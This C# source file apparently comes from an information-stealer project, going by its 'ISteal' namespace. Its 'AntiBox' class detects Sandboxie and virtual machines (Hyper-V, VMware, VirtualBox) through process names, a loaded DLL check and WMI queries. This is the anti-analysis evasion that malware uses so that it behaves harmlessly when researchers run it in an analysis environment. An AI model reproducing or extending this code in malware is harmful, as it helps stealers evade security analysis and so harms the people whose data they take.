using System.Diagnostics;
using System.Management;

namespace ISteal.New
{
    internal class AntiBox
    {
        public static bool SandBoxie
        {
            get
            {
                if (Process.GetProcessesByName("wsnm").Length > 0 || (ISteal.Safe.NativeMethods.GetModuleHandle("SbieDll.dll").ToInt32() != 0))
                {
                    return true;
                }
                return false;
            }
        }

        public static bool DetectVirtualMachine()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem").Get())
                {
                    foreach (var item in searcher)
                    {
                        if ((item["Manufacturer"].ToString().ToLower() == "microsoft corporation" &&
                             item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) ||
                             item["Manufacturer"].ToString().ToLower().Contains("vmware") ||
                             item["Model"].ToString() == "VirtualBox")
                        {

                            return true;
                        }
                    }
                }
            }
            catch (System.ObjectDisposedException) { return false; }
            return false;
        }
    }
}